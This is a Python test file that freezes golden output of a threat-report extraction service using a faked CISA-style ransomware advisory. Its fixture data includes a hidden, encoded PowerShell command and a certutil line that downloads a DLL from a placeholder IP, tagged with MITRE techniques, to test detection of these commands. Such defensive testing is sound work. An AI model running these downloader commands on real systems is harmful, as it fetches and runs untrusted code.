"""T1-B · Prev-mode CISA advisory golden.

Freezes the ``report_extraction`` and confidence/signal projection
emitted by ``services.die.investigation_results.render()`` on a
CISA-shape acquired advisory.  Uses the same monkeypatch pattern as
``test_prev_mode_p1a_evidence_source.py`` — no network access.
"""
from __future__ import annotations

import sys
from pathlib import Path

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

from tests.canonical.stage1_goldens._harness import compare_or_capture


def _install_successful_acquisition(monkeypatch):
    from services.die import investigation_results as ir

    def _fake_classify(src):
        return {
            "ida_class": "threat_report_url",
            "url_intent": {"acquirable": True, "kind": "threat_report"},
            "artifacts": [{"type": "url", "canonical": src.strip(),
                            "value": src.strip(), "source": "test"}],
        }

    class _FakeAcquired:
        def __init__(self, url):
            self.ok = True
            self.url = url
            self.article_text = (
                "Ransomware advisory · deterministic evidence surface\n"
                "PowerShell downloader observed.\n"
                "certutil.exe URL-cache abuse observed."
            )
            self.structured_blocks = []
            self.status_code = 200
            self.host = "example.gov"

        def to_dict(self):
            return {
                "ok": True, "url": self.url, "final_url": self.url,
                "vendor": "Test", "title": "Test Advisory",
                "fetched_bytes": 100_000, "duration_ms": 1000,
                "engine": "trafilatura", "source_kind": "Static article",
                "fallback_chain": ["trafilatura"],
            }

    def _fake_extract(text, blocks):
        return {
            "commands": [
                {"normalized_command":
                    "powershell -nop -w hidden -enc SGVsbG8=",
                 "mitre": ["T1059.001", "T1027"],
                 "tactic": "execution",
                 "purpose": "PowerShell encoded command",
                 "language": "powershell"},
                {"normalized_command":
                    "certutil.exe -f urlcache http://198.51.100.20/x.dll x.dll",
                 "mitre": ["T1105", "T1059.003"],
                 "tactic": "command_and_control",
                 "purpose": "Certutil URL-cache abuse",
                 "language": "cmd"},
            ],
            "mitre_techniques": [
                {"id": "T1059.001", "name": "PowerShell",
                 "tactic": "execution"},
                {"id": "T1027", "name": "Obfuscated Files or Information",
                 "tactic": "defense_evasion"},
                {"id": "T1105", "name": "Ingress Tool Transfer",
                 "tactic": "command_and_control"},
                {"id": "T1059.003", "name": "Windows Command Shell",
                 "tactic": "execution"},
            ],
            "body_artifacts": [
                {"type": "url", "value": "http://198.51.100.20/x.dll"},
                {"type": "ip", "value": "198.51.100.20"},
            ],
            "cves": [{"id": "CVE-2024-0001"}],
            "threat_actors": [{"name": "TestActor"}],
            "malware_families": [{"name": "TestFamily"}],
            "timeline": [{"ts": "2026-01-01", "event": "Initial access"}],
            "yara_rules": [], "sigma_rules": [], "hash_context": {},
            "behaviors": [{"name": "downloader"},
                          {"name": "persistence"}],
            "totals": {"artifacts": 2, "mitre": 4, "cves": 1, "actors": 1,
                       "malware": 1, "commands": 2, "timeline": 1,
                       "yara": 0, "sigma": 0, "behaviors": 2},
        }

    def _fake_investigate_all(cmds):
        out = []
        for c in cmds:
            lb = ("powershell"
                  if "powershell" in c.get("normalized_command", "").lower()
                  else "certutil.exe")
            out.append({**c, "status": "investigated",
                         "lolbas": [lb], "peeled_iocs": {}})
        return out

    def _fake_merge(investigations):
        techs, bins = [], []
        for inv in investigations:
            for m in inv.get("mitre") or []:
                if m not in [t["id"] for t in techs]:
                    techs.append({"id": m, "name": m})
            for lb in inv.get("lolbas") or []:
                if lb not in [b["binary"] for b in bins]:
                    bins.append({"binary": lb,
                                  "mitre": inv.get("mitre") or []})
        return {"techniques_union": techs, "lolbins_union": bins}

    monkeypatch.setattr(ir, "_ida_classify", _fake_classify, raising=True)
    monkeypatch.setattr(ir, "_ida_acquire",
                         lambda u: _FakeAcquired(u), raising=True)
    monkeypatch.setattr(ir, "_ida_understand",
                         lambda t, m: {"kind": "threat_report",
                                       "confidence": 0.9},
                         raising=True)
    monkeypatch.setattr(ir, "_ida_extract", _fake_extract, raising=True)
    monkeypatch.setattr(ir, "_ida_investigate_all",
                         _fake_investigate_all, raising=True)
    monkeypatch.setattr(ir, "_ida_merge", _fake_merge, raising=True)


def test_t1_b_prev_cisa_advisory_report_extraction_golden(monkeypatch):
    _install_successful_acquisition(monkeypatch)
    from services.die.investigation_results import render
    result = render("https://test.example.gov/advisory/t1b")
    obj = result.get("object") or {}
    report_extraction = obj.get("report_extraction") or {}

    # Freeze only the contract-critical keys (not the whole output blob)
    frozen = {
        k: report_extraction.get(k) for k in (
            "commands", "command_investigations", "investigation_summary",
            "mitre_techniques", "body_artifacts", "threat_actors",
            "malware_families", "behaviors", "iocs",
            "evidence_source", "evidence_source_url", "source",
        )
    }
    compare_or_capture("t1_b_prev_cisa_report_extraction", frozen)


def test_t1_b_prev_cisa_advisory_confidence_signals_golden(monkeypatch):
    _install_successful_acquisition(monkeypatch)
    from services.die.investigation_results import render
    result = render("https://test.example.gov/advisory/t1b")
    obj = result.get("object") or {}
    conf = obj.get("confidence") or {}
    signals = [{"id": s.get("id"), "status": s.get("status")}
                for s in (conf.get("signals") or [])]
    frozen = {"label": conf.get("label"), "signals": signals}
    compare_or_capture("t1_b_prev_cisa_confidence_signals", frozen)
